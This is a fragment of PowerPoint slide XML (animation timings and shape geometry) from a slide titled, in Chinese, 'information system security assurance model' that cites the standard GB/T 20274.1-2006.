                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="86" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31775"/>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31776"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="89" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31776"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="90" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31776"/>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31777"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="93" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31777"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="94" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31777"/>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31753"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="99" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31753"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="100" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31753"/>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nodePh="1">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:endCondLst>
                                    <p:cond evt="begin" delay="0">
                                      <p:tn val="101"/>
                                    </p:cond>
                                  </p:endCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="102" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="31755"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="103" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31755"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="104" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31755"/>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1756"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="107" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31756"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="108" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31756"/>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31767"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="111" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31767"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="112" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31767"/>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53" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="116" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="31769"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="117" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31769"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="118" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31769"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="119" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31769"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>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31762"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="124" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31762"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="125" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31762"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="126" presetID="2" presetClass="entr" presetSubtype="4" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="127" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="31763"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="128" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31763"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="129" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31763"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="130" presetID="2" presetClass="entr" presetSubtype="4" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="131" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="31766"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="132" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31766"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="133" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="317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animBg="1"/>
      <p:bldP spid="31750" grpId="0"/>
      <p:bldP spid="31751" grpId="0" animBg="1"/>
      <p:bldP spid="31752" grpId="0"/>
      <p:bldP spid="31753" grpId="0" animBg="1"/>
      <p:bldP spid="31754" grpId="0" animBg="1"/>
      <p:bldP spid="31755" grpId="0"/>
      <p:bldP spid="31756" grpId="0"/>
      <p:bldP spid="31757" grpId="0"/>
      <p:bldP spid="31758" grpId="0" animBg="1"/>
      <p:bldP spid="31759" grpId="0"/>
      <p:bldP spid="31760" grpId="0" animBg="1"/>
      <p:bldP spid="31761" grpId="0"/>
      <p:bldP spid="31762" grpId="0" animBg="1"/>
      <p:bldP spid="31763" grpId="0"/>
      <p:bldP spid="31764" grpId="0" animBg="1"/>
      <p:bldP spid="31765" grpId="0"/>
      <p:bldP spid="31766" grpId="0" animBg="1"/>
      <p:bldP spid="31767" grpId="0" animBg="1"/>
      <p:bldP spid="31768" grpId="0" animBg="1"/>
      <p:bldP spid="31769" grpId="0" animBg="1"/>
      <p:bldP spid="31770" grpId="0" animBg="1"/>
      <p:bldP spid="31771" grpId="0" animBg="1"/>
      <p:bldP spid="31772" grpId="0" animBg="1"/>
      <p:bldP spid="31773" grpId="0" animBg="1"/>
      <p:bldP spid="31774" grpId="0" animBg="1"/>
      <p:bldP spid="31775" grpId="0" animBg="1"/>
      <p:bldP spid="31776" grpId="0"/>
      <p:bldP spid="3177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9307" y="726028"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>信息系统安全保障模型</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="843980" y="5589240"/>
            <a:ext cx="7056784" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>国家标准：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>《GB/T 20274.1-2006  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>信息安全技术 信息系统安全保障评估框架 第一部分：简介和一般模型</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>》 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 4"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks noChangeAspect="1"/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1811338" y="1522072"/>
            <a:ext cx="5862360" cy="3967504"/>
            <a:chOff x="1141" y="981"/>
            <a:chExt cx="3660" cy="2477"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="AutoShape 3"/>
            <p:cNvSpPr>
              <a:spLocks noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1141" y="981"/>
              <a:ext cx="3660" cy="2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8" name="Group 7"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="4351" y="1389"/>
              <a:ext cx="423" cy="1609"/>
              <a:chOff x="4351" y="1389"/>
              <a:chExt cx="423" cy="1609"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="97" name="Freeform 5"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="4351" y="1389"/>
                <a:ext cx="423" cy="1609"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 423"/>
                  <a:gd name="T1" fmla="*/ 282 h 1609"/>
                  <a:gd name="T2" fmla="*/ 423 w 423"/>
                  <a:gd name="T3" fmla="*/ 0 h 1609"/>
                  <a:gd name="T4" fmla="*/ 423 w 423"/>
                  <a:gd name="T5" fmla="*/ 1327 h 1609"/>
                  <a:gd name="T6" fmla="*/ 0 w 423"/>
                  <a:gd name="T7" fmla="*/ 1609 h 1609"/>
                  <a:gd name="T8" fmla="*/ 0 w 423"/>
                  <a:gd name="T9" fmla="*/ 282 h 1609"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="0">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="0" t="0" r="r" b="b"/>
                <a:pathLst>
                  <a:path w="423" h="1609">
                    <a:moveTo>
                      <a:pt x="0" y="282"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="423" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="423" y="1327"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="1609"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="2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6"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="4351" y="1389"/>
                <a:ext cx="423" cy="1609"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 423"/>
                  <a:gd name="T1" fmla="*/ 282 h 1609"/>
                  <a:gd name="T2" fmla="*/ 423 w 423"/>
                  <a:gd name="T3" fmla="*/ 0 h 1609"/>
                  <a:gd name="T4" fmla="*/ 423 w 423"/>
                  <a:gd name="T5" fmla="*/ 1327 h 1609"/>
                  <a:gd name="T6" fmla="*/ 0 w 423"/>
                  <a:gd name="T7" fmla="*/ 1609 h 1609"/>
                  <a:gd name="T8" fmla="*/ 0 w 423"/>
                  <a:gd name="T9" fmla="*/ 282 h 1609"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="0">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="0" t="0" r="r" b="b"/>
                <a:pathLst>
                  <a:path w="423" h="1609">
                    <a:moveTo>
                      <a:pt x="0" y="282"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="423" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="423" y="1327"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="1609"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="282"/>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 name="Group 10"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="4023" y="1650"/>
              <a:ext cx="375" cy="1565"/>
              <a:chOff x="4023" y="1650"/>
              <a:chExt cx="375" cy="1565"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="95" name="Freeform 8"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="4023" y="1650"/>
                <a:ext cx="375" cy="1565"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 375"/>
                  <a:gd name="T1" fmla="*/ 234 h 1565"/>
                  <a:gd name="T2" fmla="*/ 375 w 375"/>
                  <a:gd name="T3" fmla="*/ 0 h 1565"/>
                  <a:gd name="T4" fmla="*/ 375 w 375"/>
                  <a:gd name="T5" fmla="*/ 1332 h 1565"/>
                  <a:gd name="T6" fmla="*/ 0 w 375"/>
                  <a:gd name="T7" fmla="*/ 1565 h 1565"/>
                  <a:gd name="T8" fmla="*/ 0 w 375"/>
                  <a:gd name="T9" fmla="*/ 234 h 1565"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="0">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="0" t="0" r="r" b="b"/>
                <a:pathLst>
                  <a:path w="375" h="1565">
                    <a:moveTo>
                      <a:pt x="0" y="234"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="375" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="375" y="1332"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="1565"/>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9"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="4023" y="1650"/>
                <a:ext cx="375" cy="1565"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 375"/>
                  <a:gd name="T1" fmla="*/ 234 h 1565"/>
                  <a:gd name="T2" fmla="*/ 375 w 375"/>
                  <a:gd name="T3" fmla="*/ 0 h 1565"/>
                  <a:gd name="T4" fmla="*/ 375 w 375"/>
                  <a:gd name="T5" fmla="*/ 1332 h 1565"/>
                  <a:gd name="T6" fmla="*/ 0 w 375"/>
                  <a:gd name="T7" fmla="*/ 1565 h 1565"/>
                  <a:gd name="T8" fmla="*/ 0 w 375"/>
                  <a:gd name="T9" fmla="*/ 234 h 1565"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="0">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="0" t="0" r="r" b="b"/>
                <a:pathLst>
                  <a:path w="375" h="1565">
                    <a:moveTo>
                      <a:pt x="0" y="234"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="375" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="375" y="1332"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="1565"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="234"/>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 name="Group 13"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="1160" y="1633"/>
              <a:ext cx="2517" cy="1799"/>
              <a:chOff x="1160" y="1633"/>
              <a:chExt cx="2517" cy="1799"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="93" name="Rectangle 11"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1160" y="1633"/>
                <a:ext cx="2517" cy="17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Rectangle 12"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1160" y="1633"/>
                <a:ext cx="2517" cy="1799"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="952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1" name="Group 16"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="1160" y="998"/>
              <a:ext cx="3614" cy="635"/>
              <a:chOff x="1160" y="998"/>
              <a:chExt cx="3614" cy="635"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="91" name="Freeform 14"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
